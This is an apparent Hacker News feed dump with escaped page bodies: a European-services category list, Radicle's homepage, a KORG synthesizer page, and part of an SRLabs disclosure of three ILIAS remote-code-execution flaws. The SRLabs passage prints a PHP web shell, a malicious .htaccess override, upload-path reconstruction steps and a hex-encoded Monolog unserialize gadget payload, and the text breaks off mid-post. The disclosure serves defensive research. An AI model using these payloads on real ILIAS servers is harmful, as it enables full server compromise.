      &lt;item rend="dd-1"&gt;When you buy from local businesses, you are supporting yourself down the road. Taxes paid by the company come back to you indirectly and the company creates jobs in your region.&lt;/item&gt;
      &lt;item rend="dt-2"&gt;
        &lt;p&gt;Data protection / GDPR&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-2"&gt;Some companies outside Europe tend to ignore data protection and related laws such as the GDPR or do not implement them correctly.&lt;/item&gt;
      &lt;item rend="dt-3"&gt;
        &lt;p&gt;VAT / Billing&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-3"&gt;As a business that operates in Europe, it is possible to get a VAT refund for products/services of other European companies. European companies also tend to offer payment methods that are commonly used in Europe.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;
        &lt;p&gt;Similar legal requirements&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-4"&gt;Within the EU, many laws and framework conditions are set by the EU, which helps to cover a large market without having to consider large country-specific differences. It is also easier to enforce your rights against another company located in the EU.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Categories&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Web analytics services&lt;/head&gt;&lt;p&gt;A web analytics service tracks user behavior on websites so that website owners can understand user usage and optimize their websites.&lt;/p&gt;31 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Cloud computing platforms&lt;/head&gt;&lt;p&gt;A cloud computing platform provides on-demand hosting services.&lt;/p&gt;12 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Content delivery network (CDN) services&lt;/head&gt;&lt;p&gt;A content delivery network (CDN) is a geographically distributed network.&lt;/p&gt;6 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Email providers&lt;/head&gt;&lt;p&gt;An email provider provides its users with an e-mail address and the corresponding mailboxes.&lt;/p&gt;20 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Virtual private server (VPS) hosters&lt;/head&gt;&lt;p&gt;A virtual private server (VPS) hoster provides virtual servers with predefined RAM, storage, traffic and virtual cores.&lt;/p&gt;23 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Search engines&lt;/head&gt;&lt;p&gt;A search engine allows their users to search the internet.&lt;/p&gt;6 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Transactional email service&lt;/head&gt;&lt;p&gt;A transactional mail service offers users the ability to send emails from their applications via the service.&lt;/p&gt;7 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Domain name registrars&lt;/head&gt;&lt;p&gt;Domain name registrars are companies that manages the reservation of Internet domain names.&lt;/p&gt;13 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Time tracking apps&lt;/head&gt;&lt;p&gt;A time tracking app is an application that helps users track how much time was spent on which task or project.&lt;/p&gt;13 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Navigation apps&lt;/head&gt;&lt;p&gt;Navigation apps help you get from A to B.&lt;/p&gt;8 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Uptime monitoring services&lt;/head&gt;&lt;p&gt;An uptime monitoring service periodically checks if a website or other service is active.&lt;/p&gt;12 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;File hosting services&lt;/head&gt;&lt;p&gt;With a file hosting service, users can upload files to back them up or share them with others.&lt;/p&gt;11 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Machine translation services&lt;/head&gt;&lt;p&gt;A machine translation service (translator) is a service that programmatically translates text from one language to another.&lt;/p&gt;5 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Object storage providers&lt;/head&gt;&lt;p&gt;Object storage providers allow their users to store files hierarchically.&lt;/p&gt;15 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Microblogging services&lt;/head&gt;&lt;p&gt;A microblogging service allows users to post short texts, images or links to videos.&lt;/p&gt;2 alternatives&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731976</guid><pubDate>Fri, 23 Jan 2026 13:01:51 +0000</pubDate></item><item><title>Radicle: The Sovereign Forge</title><link>https://radicle.xyz</link><description>&lt;doc fingerprint="a0671596b436ca2c"&gt;
  &lt;main&gt;
    &lt;p&gt;Radicle is a sovereign {code forge} built on Git.&lt;/p&gt;
    &lt;head rend="h1"&gt;Synopsis&lt;/head&gt;
    &lt;p&gt;Radicle is an open source, peer-to-peer code collaboration stack built on Git. Unlike centralized code hosting platforms, there is no single entity controlling the network. Repositories are replicated across peers in a decentralized manner, and users are in full control of their data and workflow.&lt;/p&gt;
    &lt;p&gt; The Radicle &lt;code&gt;heartwood&lt;/code&gt; repository. Repository ID
  &lt;code&gt;rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5&lt;/code&gt;.
&lt;/p&gt;
    &lt;head rend="h1"&gt;Get started&lt;/head&gt;
    &lt;quote&gt;√∞¬æ ¬∑&lt;/quote&gt;
    &lt;p&gt;To install Radicle, simply run the command below from your shell, or go to the download page.&lt;/p&gt;
    &lt;code&gt;curl -sSLf https://radicle.xyz/install | sh&lt;/code&gt;
    &lt;p&gt;Alternatively, you can build from source.&lt;/p&gt;
    &lt;p&gt;For now, Radicle only works on Linux, macOS and BSD variants.&lt;/p&gt;
    &lt;head rend="h2"&gt;Radicle Desktop √∞¬•√Ø¬∏&lt;/head&gt;
    &lt;p&gt;For a graphical collaborative experience check out the Radicle Desktop client, as well.&lt;/p&gt;
    &lt;head rend="h1"&gt;How it works&lt;/head&gt;
    &lt;p&gt;The Radicle protocol leverages cryptographic identities for code and social artifacts, utilizes Git for efficient data transfer between peers, and employs a custom gossip protocol for exchanging repository metadata.&lt;/p&gt;
    &lt;head rend="h2"&gt;Your Data, Forever and Secure&lt;/head&gt;
    &lt;p&gt;All social artifacts are stored in Git, and signed using public-key cryptography. Radicle verifies the authenticity and authorship of all data for you.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unparalleled Autonomy&lt;/head&gt;
    &lt;p&gt;Radicle enables users to run their own nodes, ensuring censorship-resistant code collaboration and fostering a resilient network without reliance on third-parties.&lt;/p&gt;
    &lt;head rend="h2"&gt;Local-first&lt;/head&gt;
    &lt;p&gt;Radicle is local-first, providing always-available functionality even without internet access. Users own their data, making migration, backup, and access easy both online and offline.&lt;/p&gt;
    &lt;head rend="h2"&gt;Evolvable &amp;amp; Extensible&lt;/head&gt;
    &lt;p&gt;Radicle√¢s Collaborative Objects (COBs) provide Radicle√¢s social primitive. This enables features such as issues, discussions and code review to be implemented as Git objects. Developers can extend Radicle√¢s capabilities to build any kind of collaboration flow they see fit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Modular by Design&lt;/head&gt;
    &lt;p&gt;The Radicle Stack comes with a CLI, web interface and TUI, that are backed by the Radicle Node and HTTP Daemon. It√¢s modular, so any part can be swapped out and other clients can be developed.&lt;/p&gt;
    &lt;quote&gt;√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢ Radicle CLI √¢√¢ Radicle Web √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢ Radicle Repository √¢ √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢ √¢ √¢ code √¢ √¢ issues √¢ √¢ patches √¢ √¢ √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢¬§ √¢ Radicle Storage (Git) √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢ √¢ Radicle Node √¢√¢ Radicle HTTPD √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢¬§√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢¬§ √¢ NoiseXK √¢√¢ HTTP + JSON √¢ √¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢√¢&lt;/quote&gt;
    &lt;head rend="h1"&gt;Contributing&lt;/head&gt;
    &lt;p&gt;Radicle is free and open source software under the MIT and Apache 2.0 licenses. Get involved by contributing code.&lt;/p&gt;
    &lt;head rend="h1"&gt;Updates&lt;/head&gt;
    &lt;p&gt;Follow us on √∞ Mastodon, √∞¬¶ Bluesky or √∞¬¶ Twitter to stay updated, join our community on √∞¬¨ Zulip, or Subscribe&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;14.01.2026 Radicle 1.6.0 released. √¢¬®&lt;/item&gt;
      &lt;item&gt;30.09.2025 Radicle 1.5.0 released.&lt;/item&gt;
      &lt;item&gt;04.09.2025 Radicle 1.4.0 released.&lt;/item&gt;
      &lt;item&gt;12.08.2025 Radicle 1.3.0 released.&lt;/item&gt;
      &lt;item&gt;17.07.2025 Radicle 1.2.1 released.&lt;/item&gt;
      &lt;item&gt;13.06.2025 Radicle Desktop is out. √∞¬•√Ø¬∏&lt;/item&gt;
      &lt;item&gt;02.06.2025 Radicle 1.2.0 released.&lt;/item&gt;
      &lt;item&gt;05.12.2024 Radicle 1.1.0 released.&lt;/item&gt;
      &lt;item&gt;10.09.2024 Radicle 1.0.0 released.&lt;/item&gt;
      &lt;item&gt;26.03.2024 Radicle 1.0.0-rc.1 released.&lt;/item&gt;
      &lt;item&gt;10.03.2024 New Radicle homepage.&lt;/item&gt;
      &lt;item&gt;05.03.2024 Radicle Guides launch.&lt;/item&gt;
      &lt;item&gt;05.03.2024 Radicle makes it to the top of Hacker News!&lt;/item&gt;
      &lt;item&gt;18.04.2023 Radicle heartwood is announced.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Blog&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;14.08.2025 Jujutsu + Radicle = √¢¬§√Ø¬∏&lt;/item&gt;
      &lt;item&gt;12.08.2025 Canonical References&lt;/item&gt;
      &lt;item&gt;23.07.2025 Using Radicle CI for Development&lt;/item&gt;
      &lt;item&gt;30.05.2025 How we used Radicle with GitHub Actions&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Feedback&lt;/head&gt;
    &lt;p&gt;If you have feedback, join our Zulip or send us an email at feedback@radicle.xyz. Emails sent to this address are automatically posted to our #feedback channel on Zulip.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46732213</guid><pubDate>Fri, 23 Jan 2026 13:25:42 +0000</pubDate></item><item><title>KORG phase8 ‚Äì Acoustic Synthesizer</title><link>https://www.korg.com/us/products/dj/phase8/</link><description>&lt;doc fingerprint="ae7bc2283ab4b732"&gt;
  &lt;main&gt;
    &lt;p&gt;phase8 is an organic, responsive instrument that feels alive in your hands and responds to the world around you.&lt;/p&gt;
    &lt;head rend="h1"&gt;Haptic sound generation through Acoustic Synthesis&lt;/head&gt;
    &lt;p&gt;Acoustic Synthesis uses physically vibrating bodies to generate sound, enhanced with the electronic control you‚Äôd expect from a synthesizer. The result is an instrument that produces sound which feels alive and responds to physical interactions such as touch and acoustic feedback. &lt;lb/&gt; It is beyond ‚Äúanalogue vs digital‚Äù. It‚Äôs even beyond electronics. &lt;lb/&gt;8 independent electromechanical voices with steel resonators are at the heart of the instrument‚Äôs acoustic sound.&lt;/p&gt;
    &lt;head rend="h2"&gt;Swapable and tunable steel resonators&lt;/head&gt;
    &lt;p&gt;phase8 comes with 13 chromatically tuned resonators; 8 of your choice can be installed at any one time. Through envelope control, these resonators can produce everything from short percussive sounds to long, drawn-out sustained notes. &lt;lb/&gt;The design allows you to easily swap and tune resonators, letting you customise the scale and character of your phase8.&lt;/p&gt;
    &lt;head rend="h2"&gt;Polymetric rhythm sequencer&lt;/head&gt;
    &lt;p&gt; An intuitive sequencer supports both step programming and unquantized live recording. Each voice offers step skip for polymetric sequencing. &lt;lb/&gt;All sequences can be saved and recalled across 8 memory slots.&lt;/p&gt;
    &lt;head rend="h2"&gt;Modulation modes&lt;/head&gt;
    &lt;p&gt;You can cycle between three distinct amplitude modulation effects: tremolo and two audio rate, pitch-dependent modulation types. The last modulation effect can be optionally harmonically quantised.&lt;/p&gt;
    &lt;head rend="h2"&gt;Trigger delay&lt;/head&gt;
    &lt;p&gt;Using the instrument‚Äôs shift knob, you can add delayed triggers to the resonators relative to the selected or synced tempo.&lt;/p&gt;
    &lt;head rend="h2"&gt;Parameter automation&lt;/head&gt;
    &lt;p&gt;All controls on the instrument‚Äôs panel can be automated over a sequence using the record function.&lt;/p&gt;
    &lt;head rend="h2"&gt;Real-time interaction&lt;/head&gt;
    &lt;p&gt;Beyond adjusting parameters, phase8 invites physical interaction. Sculpt sound by touching, plucking, strumming, or tapping the resonators ‚Äì or experiment by adding found objects for new textures. &lt;lb/&gt;The AIR slider lets you boost (or quiet) the acoustic response of whatever you bring in contact with the instrument.&lt;/p&gt;
    &lt;head rend="h2"&gt;External connectivity&lt;/head&gt;
    &lt;p&gt; Both MIDI / USB-MIDI and CV can be used to externally control the knob parameters. &lt;lb/&gt;phase8 can be tempo synchronized to other devices over MIDI / USB-MIDI and Sync. &lt;lb/&gt;External MIDI devices can be used to trigger notes in the Acoustic Synth, and the sequencer can trigger notes in external MIDI instruments over MIDI / USB-MIDI. These connectivity options allow many possibilities for phase8 to integrate into any creative setup.&lt;/p&gt;
    &lt;head rend="h2"&gt;Presale Exclusive Package with Limited Resonators&lt;/head&gt;
    &lt;p&gt;The phase8 presale exclusive package includes three selected limited-edition percussive resonators. Created through experimentation beyond the standard chromatic set, these resonators are designed for open-ended, tactile sound exploration‚Äîeach offering its own distinctive percussive character. &lt;lb/&gt;Available exclusively as part of the presale package.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46732967</guid><pubDate>Fri, 23 Jan 2026 14:34:46 +0000</pubDate></item><item><title>Three RCEs in Ilias Learning Management System</title><link>https://srlabs.de/blog/breaking-ilias-part-2-three-to-rce</link><description>&lt;doc fingerprint="8c738f13a4271280"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Breaking ILIAS #2: Three paths towards RCE&lt;/head&gt;
    &lt;p&gt;We describe three previously unknown vulnerabilities enabling remote code execution (RCE) in versions 8, 9, and 10 of the widely used learning management system ILIAS.&lt;/p&gt;
    &lt;p&gt;We reported the vulnerabilities through our responsible disclosure process.&lt;lb/&gt;With patches now in place, we can share the details here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;In the first blog post of our little ILIAS series, we describe how we uncovered and exploited a stored cross-site scripting (XSS) vulnerability to obtain administrative privileges and RCE in a recent red team engagement.&lt;/p&gt;
    &lt;head rend="h2"&gt;Today√¢s walkthrough&lt;/head&gt;
    &lt;p&gt;We explore similar vulnerabilities, all of which lead to RCE. First, we discuss an unauthenticated RCE exploiting the course certification import functionality, which is often found in public spaces of ILIAS instances. Next, we describe two authenticated remote-code-execution vulnerabilities caused by insecure deserialization. Both can be exploited by authorized users and often do not require full administrative rights.&lt;/p&gt;
    &lt;head rend="h1"&gt;1. Unauthenticated RCE (CVE-2025-11344)&lt;/head&gt;
    &lt;p&gt;Prerequisites. Exploitation requires public access to objects which support ILIAS√¢ certificate functionality. An ILIAS √¢certificate√¢ can be issued for achievements such as course completion. To avoid confusion with X.509 certificates, we also use the term √¢course certificate√¢ in this blog post.&lt;lb/&gt;The following object types are affected:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test (cmdNode: &lt;code&gt;qx&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Course (cmdNode: &lt;code&gt;lv&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These objects, when placed in the public section of ILIAS, allow any user with read access (including unauthenticated guests) to interact with the certification editor functionality.&lt;/p&gt;
    &lt;p&gt;The √¢Exercise√¢ object shared this vulnerability in the tested v10-beta3, but it was since patched by enforcing a stricter access control in this commit: &lt;code&gt;$this-&amp;gt;checkPermission("write")&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;However, the stable release only enforces &lt;code&gt;$this-&amp;gt;checkPermission("read")&lt;/code&gt; for other object types. Read permissions are typically granted in public contexts.&lt;/p&gt;
    &lt;head rend="h2"&gt;Upload arbitrary files to the web server&lt;/head&gt;
    &lt;p&gt;We start our analysis with the ilCertificateGUI class, which handles certification configuration and export. Due to improper access control in the route processing logic, we are able to directly call actions like certificateEditor() and certificateExportFO() without authentication.&lt;/p&gt;
    &lt;p&gt;These methods are meant to be available only to users with editing rights (which would normally be course or exercise administrators). However, because the upstream controllers (&lt;code&gt;ilRepositoryGUI -&amp;gt; ilObjTestGUI&lt;/code&gt;) do not enforce proper checks, we can reach the certification upload functionality without restrictions.&lt;/p&gt;
    &lt;p&gt;The certification editor includes a feature to import course certificate templates as ZIP files. This is an intended and valid functionality to enable customization. The uploaded ZIP gets extracted and parsed by ilXlsFoParser(), which expects a specific XML format inside the archive.&lt;/p&gt;
    &lt;p&gt;Playing around, we notice something unusual: When the uploaded ZIP lacks the expected structure, the parser throws an exception when the expected XML file cannot be found.&lt;/p&gt;
    &lt;p&gt;The critical detail is that this exception is unhandled. As a result, the cleanup routine, specifically the &lt;code&gt;unlink()&lt;/code&gt; call that removes the unzipped files from disk, is never executed. This leaves all extracted files in a web-accessible subdirectory under &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When we upload a &lt;code&gt;.zip&lt;/code&gt; archive containing a &lt;code&gt;.php&lt;/code&gt; script, upload and extraction succeed, but direct execution of our new &lt;code&gt;.php&lt;/code&gt; file is not possible because all files under the &lt;code&gt;/data/&lt;/code&gt; directory are protected by a global &lt;code&gt;.htaccess&lt;/code&gt; file located in the ILIAS &lt;code&gt;/public/&lt;/code&gt; folder, which is configured as our web server√¢s &lt;code&gt;DocumentRoot&lt;/code&gt;. It contains the following directive:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;
    RewriteEngine on
    RewriteRule ^data/.*/.*/.*$ wac.php [L]
&amp;lt;/IfModule&amp;gt;&lt;/code&gt;
    &lt;p&gt;This rule rewrites any requests to &lt;code&gt;/data/.*/.*/.*&lt;/code&gt; so they are handled by &lt;code&gt;wac.php&lt;/code&gt;, which in turn calls &lt;code&gt;ilWebAccessCheckerDelivery::run()&lt;/code&gt; to perform access control checks. If access is permitted, the file is served with headers like &lt;code&gt;Content-Disposition: attachment&lt;/code&gt; or &lt;code&gt;inline&lt;/code&gt; to ensure it√¢s treated as a download and hasn√¢t become executable. This is an intentional safeguard to prevent arbitrary code execution, even if a &lt;code&gt;.php&lt;/code&gt; file somehow makes its way into a subdirectory of &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Change .htaccess directives&lt;/head&gt;
    &lt;p&gt;Take note of the &lt;code&gt;[L]&lt;/code&gt; flag in the &lt;code&gt;.htaccess&lt;/code&gt; definition. It is a common misconception that this flag would prevent any further rewriting altogether. In fact, &lt;code&gt;[L]&lt;/code&gt; only stops that set of rewrite rules from continuing. This is a crucial detail, as it does not prevent Apache from continuing the directory walk or parsing other &lt;code&gt;.htaccess&lt;/code&gt; files in subdirectories.&lt;/p&gt;
    &lt;p&gt;This enables us to define more hacker-friendly directives wherever we can create &lt;code&gt;.htaccess&lt;/code&gt; files. So we include our own &lt;code&gt;.htaccess&lt;/code&gt; file inside the zip file and give the web server a simple new directive:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;
    RewriteEngine On  
    RewriteRule ^$ . [L]  
    AddType application/x-httpd-php .sec
&amp;lt;/IfModule&amp;gt;&lt;/code&gt;
    &lt;p&gt;Once the ZIP is extracted, this &lt;code&gt;.htaccess&lt;/code&gt; file lands inside the same subfolder in &lt;code&gt;/data/&lt;/code&gt; as our PHP payload. Apache now encounters and respects multiple &lt;code&gt;.htaccess&lt;/code&gt; files: The first one at the DocumentRoot and our new one inside the extracted directory. Our new specific directives for this subdirectory overrule those specified in the parent folders.&lt;/p&gt;
    &lt;p&gt;Enabling &lt;code&gt;RewriteEngine&lt;/code&gt; "disables" the original rewrite rule, preventing Apache from routing requests through &lt;code&gt;wac.php&lt;/code&gt;. We then instruct the web server to treat &lt;code&gt;.sec&lt;/code&gt; files as PHP executables using the directive: &lt;code&gt;AddType application/x-httpd-php .sec&lt;/code&gt;. As a result, a &lt;code&gt;.sec&lt;/code&gt; file is now interpreted and executed by the server as a PHP file.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Why is the .sec extension necessary at all?&lt;/p&gt;&lt;lb/&gt;In an ILIAS basic installation the custom file extension might not be necessary. However, if operators apply recommended security hardening, Apache configurations following security advisories may deny direct access to&lt;code&gt;.php&lt;/code&gt;files located in&lt;code&gt;/data/*&lt;/code&gt;at host-level configuration. By using a custom extension, we preemptively circumvent such a restriction.&lt;/quote&gt;
    &lt;p&gt;We have now bypassed the global rewrite protections and enabled full code execution by adding a custom &lt;code&gt;.htaccess&lt;/code&gt; file to the ZIP file, and thus the extraction subfolder insider &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;We upload a ZIP archive containing a folder named &lt;code&gt;rce&lt;/code&gt; with the following files:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;a.sec&lt;/code&gt;: a simple PHP web shell (&lt;code&gt;&amp;lt;?php system($_GET['c']); ?&amp;gt;&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.htaccess&lt;/code&gt;: the overriding configuration described above&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once uploaded, we need to locate the exact path the ZIP contents were extracted to. ILIAS dynamically generates custom paths during the course certificate import process. In our case, the resulting paths follow this pattern:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;/data/[client_id]/assessment/certificates/[upload_id]/[timestamp]__0__[object_type]__[upload_id]__certificate/rce/a.sec&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Despite the path√¢s dynamic nature, we are able to reconstruct it, as all components are either deterministic, accessible by the client or easily guessable. Here√¢s how we obtain each component:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;client_id&lt;/code&gt;can be found in the&lt;code&gt;ilClientId&lt;/code&gt;cookie set by ILIAS during session initialization.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;upload_id&lt;/code&gt;would be exposed to authenticated in users in a JavaScript. However, this is not the case for unauthenticated users, so we need to find a workaround. Looking at the execution flow we notice that any method in the related class can be invoked directly. Conveniently, there√¢s a method named certificateExportFO(). By setting its name as the value of the&lt;code&gt;cmd&lt;/code&gt;URL parameter we can directly invoke it and trigger a 302 redirect initiating a file download. The filename in the&lt;code&gt;Content-Disposition&lt;/code&gt;header includes&lt;code&gt;upload_id&lt;/code&gt;, which we extract using the following regular expression:&lt;code&gt;__([a-zA-Z0-9]{3})__(\d+)__&lt;/code&gt;. This allows us to recover the necessary ID for any publicly accessible and vulnerable object type.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;timestamp&lt;/code&gt;is generated using PHP√¢s&lt;code&gt;time()&lt;/code&gt;function at the moment the foldername is generated right after upload. Because this happens just milliseconds after the upload request, we can identify the value by iterating through a small time window.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;object_type&lt;/code&gt;is a short identifier representing the ILIAS object type, determined using the&lt;code&gt;ref_id&lt;/code&gt;in the URL. In our case, the object is&lt;code&gt;TestObject&lt;/code&gt;, so the type is&lt;code&gt;tst&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Putting it all together, the final path may look like this:&lt;code&gt;/data/myilias/assessment/certificates/415/1753256753__0__tst__415__certificate/rce/a.sec&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;A GET request to that URL with a &lt;code&gt;?c=&amp;lt;CLI_COMMAND&amp;gt;&lt;/code&gt; query parameter confirms successful remote code execution, returning the command√¢s output.&lt;/p&gt;
    &lt;head rend="h3"&gt;CVE-2025-11344 - PoC Exploit&lt;/head&gt;
    &lt;p&gt;Summing up, this RCE vulnerability is results from a combination of overlooked security issues:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Inadequate access control checks in the class chain leading to course certificate-related actions&lt;/item&gt;
      &lt;item&gt;Uncaught exceptions on ZIP and XML parsing logic prevent cleanup of extracted files&lt;/item&gt;
      &lt;item&gt;Insufficient checks on the extracted zip contents allow us to place an &lt;code&gt;.htaccess&lt;/code&gt;file&lt;/item&gt;
      &lt;item&gt;.htaccess inheritance allows us to override directives for subfolders&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Impact: Complete server compromise with no authentication required if one of the two object types √¢Test√¢ or √¢Course√¢ is exposed in a public area.&lt;/p&gt;
    &lt;head rend="h1"&gt;2. Authenticated RCE (CVE-2025-11345)&lt;/head&gt;
    &lt;p&gt;File uploads during import in ILIAS are handled by several adapters defined for different import models in class.ilImport.php. The adapter first extracts the uploaded ZIP file and processes the accompanying XML. During this process, importXmlRepresentation reads the extracted XML, which is then passed into &lt;code&gt;importRandomQuestionSetConfig&lt;/code&gt; and reaches an &lt;code&gt;unserialize()&lt;/code&gt; call in class.ilObjTestXMLParser.&lt;/p&gt;
    &lt;p&gt;Insecure deserialization. The use of &lt;code&gt;unserialize()&lt;/code&gt; alone does not inherently result in RCE. However, passing attacker-controlled input to this function without restricting &lt;code&gt;allowed_classes&lt;/code&gt; via the &lt;code&gt;options&lt;/code&gt; parameter often enables undesired behavior. The PHP documentation also highlights that object instantiation and autoloading in such scenarios can lead to code execution.&lt;/p&gt;
    &lt;p&gt;Magic functions. &lt;code&gt;unserialize()&lt;/code&gt; becomes a problem when so-called magic functions are available, which override PHP default behavior for certain actions on the object especially around its lifecycle (creation, destruction but also serialization and deserialization). If the application contains any class definition that contains a magic function that executes code based on attacker-controllable class fields, we can achieve RCE.&lt;/p&gt;
    &lt;p&gt;Composer-based PHP applications frequently include third-party packages that contain such classes with exploitable magic methods simply due to a large dependency footprint. To assess this risk in ILIAS, we examine all dependencies and stumble across the inclusion of &lt;code&gt;Monolog&lt;/code&gt;, a commonly used logging library.&lt;/p&gt;
    &lt;p&gt;We construct a Monolog-specific payload using PHARGGC, a tool specialized in constructing gadget chains for PHP &lt;code&gt;unserialize()&lt;/code&gt;. The payload leverages a combination of &lt;code&gt;FingersCrossedHandler&lt;/code&gt; and &lt;code&gt;GroupHandler&lt;/code&gt; to achieve code execution. For demonstration purposes, the payload below executes the following command:
&lt;code&gt;echo 'SRLabs was here' &amp;gt; /tmp/__PWNED__&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;To ensure reliable execution, we hex-encode the fields in order to replace raw &lt;code&gt;\0&lt;/code&gt; characters that would otherwise disrupt parsing. The final payload is:&lt;/p&gt;
    &lt;code&gt;O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:39:"\65\63\68\6f\20\27\53\52\4c\61\62\73\20\77\61\73\20\68\65\72\65\27\20\3e\20\2f\74\6d\70\2f\5f\5f\50\57\4e\45\44\5f\5f";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}&lt;/code&gt;
